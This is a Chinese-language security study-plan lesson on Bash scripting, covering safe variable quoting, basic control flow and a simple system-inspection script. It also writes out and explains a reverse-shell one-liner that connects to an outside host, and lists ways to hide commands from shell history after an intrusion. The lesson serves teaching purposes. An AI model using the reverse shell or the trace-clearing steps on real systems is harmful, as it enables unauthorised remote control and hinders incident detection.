---
title: Day018：操作系统与脚本 - Bash 脚本编程安全
tags:
  - 网络
  - 安全
  - 学习计划
categories:
  - 网络安全
abbrlink: 39596
date: 2026-02-09
updated: 2026-02-09
---

# Day018：操作系统与脚本 - Bash 脚本编程安全

- **日期**：2026-02-09
- **周次**：第 3 周
- **模块**：操作系统与脚本
- **主题**：Bash 脚本编程安全
- **预计学习时间**：3 小时

---

## 🎯 学习目标

学完今天你应该能做到：

- **自动化**：写一个简单的脚本，每天自动检查有没有人试图暴力破解你的 SSH。
- **看懂后门**：理解黑客经典的“反弹 Shell”一句话木马原理。
- **安全编码**：知道为什么 `rm $var` 这种写法可能会把系统删光。

<!--more-->

## 📚 完整学习内容（必读）

### 一、概念理解：Shell 是什么？

Shell（壳）是包在 Linux 内核（核）外面的一层皮。我们跟系统说话（输入命令），都得通过它翻译。
**Bash** (Bourne Again Shell) 是最常用的 Shell。

脚本（Script）就是把一堆命令写在一个文件里，让 Shell 一次性执行完。

### 二、原理讲解：黑客的“一句话木马”

你在 CTF 或渗透测试中，经常会见到这行代码：
`bash -i >& /dev/tcp/10.0.0.1/8080 0>&1`

这是什么？这就是**反弹 Shell (Reverse Shell)**。
1.  `bash -i`：启动一个交互式的 bash。
2.  `> /dev/tcp/10.0.0.1/8080`：把这个 bash 的**输出**（你看到的屏幕结果）重定向发送给黑客的电脑 (10.0.0.1)。
3.  `0>&1`：把这个 bash 的**输入**（你敲的键盘）也重定向到黑客那边。

**结果**：黑客在他的电脑上敲命令，命令在你的电脑上执行，结果回显给黑客。你的电脑被控制了。

### 三、技术细节：实战编码规范

#### 1. 起手式 (Shebang)
脚本第一行必须写：
```bash
#!/bin/bash
```
这告诉系统：请用 bash 解释器来运行下面的内容。

#### 2. 变量引用（千万要加引号！）
**错误写法**：
```bash
rm -rf $DIR/
```
如果 `$DIR` 变量是空的，或者包含空格，命令可能变成 `rm -rf /`，**系统卒**。

**正确写法**：
```bash
rm -rf "${DIR:?}"/
```
加引号保护变量边界，`:?` 表示如果变量为空则报错停止，不执行删除。

#### 3. 常见逻辑控制
- **If 判断**：
  ```bash
  if [ -f "/etc/passwd" ]; then
      echo "文件存在"
  fi
  ```
- **循环**：
  ```bash
  for ip in $(cat ips.txt); do
      ping -c 1 $ip
  done
  ```

### 四、进阶知识：历史记录隐身

黑客入侵后，第一件事往往是清除痕迹。
- 历史记录文件：`~/.bash_history`
- 隐身技巧：在命令前加空格（如 ` ls -la`），配置得当的系统不会记录以空格开头的命令。
- 清除当前会话：`history -c`。

### 五、本日知识点速查表

| 序号 | 核心概念 | 关键点 | 备注 |
|------|----------|--------|------|
| 1 | **Shebang** | `#!/bin/bash` | 脚本第一行 |
| 2 | **chmod +x** | 赋予执行权限 | 否则无法运行 |
| 3 | **$1, $2** | 位置参数 | 脚本接收的第1、2个参数 |
| 4 | **2>&1** | 错误重定向 | 把报错信息也当成正常信息输出 |
| 5 | **反弹Shell** | 主动连黑客 | 突破防火墙的利器 |

---

## 🔧 实践任务（合法授权范围内）

### 任务 1：你的第一个巡检脚本

我们来写一个脚本，检查系统是否“健康”。

**操作步骤**：
1. `vim check.sh`，写入以下内容：
   ```bash
   #!/bin/bash
   echo "=== 系统巡检开始 ==="

   # 1. 检查谁在登录
   echo "[*] 当前登录用户:"
   who

   # 2. 检查磁盘空间
   echo "[*] 磁盘使用情况:"
   df -h | grep "/$"

   # 3. 检查是否有大流量连接
   echo "[*] 网络连接数:"
   netstat -ant | wc -l

   echo "=== 巡检结束 ==="
   ```
2. 赋予权限：`chmod +x check.sh`
3. 运行：`./check.sh`

### 任务 2：寻找“大文件”（模拟应急响应）

假设服务器被植入了挖矿病毒，磁盘快满了。写个命令找出最大的文件。

**命令**：
`find / -type f -size +100M`
（在根目录下查找类型为文件、大小超过 100MB 的文件）

### 任务 3：理解“管道”

尝试把 `ls -l` 的结果，只保留文件名这一列。
**命令**：
`ls -l | awk '{print $9}'`
（`awk` 是一个强大的文本处理工具，$9 表示第9列，也就是文件名）

---

## 📝 巩固练习

### 练习 1：概念理解
**问**：`chmod 777 script.sh` 和 `chmod +x script.sh` 有什么区别？
**答**：
- `777` 赋予所有用户读、写、执行权限（极度危险，别人可以修改你的脚本植入木马）。
- `+x` 仅仅赋予执行权限，保留原有的读写限制（安全推荐）。

### 练习 2：实操复盘
**问**：如何让脚本在后台默默运行，即使我断开 SSH 也不停止？
**答**：使用 `nohup ./script.sh &`。

---

## ✅ 学习成果自检

- [ ] 我能写出一个 Hello World 脚本并运行。
- [ ] 我知道为什么变量要加双引号 `"$VAR"`。
- [ ] 我看懂了 `bash -i >& /dev/tcp/...` 是在干什么。

---

> 💬 **老师寄语**：
> Shell 脚本是 Linux 管理员的魔法棒。不用追求写出几百行的复杂程序，能用几行代码解决重复劳动，你就已经入门了。明天，我们将学习一种更优雅、更强大的语言 —— **Python**。
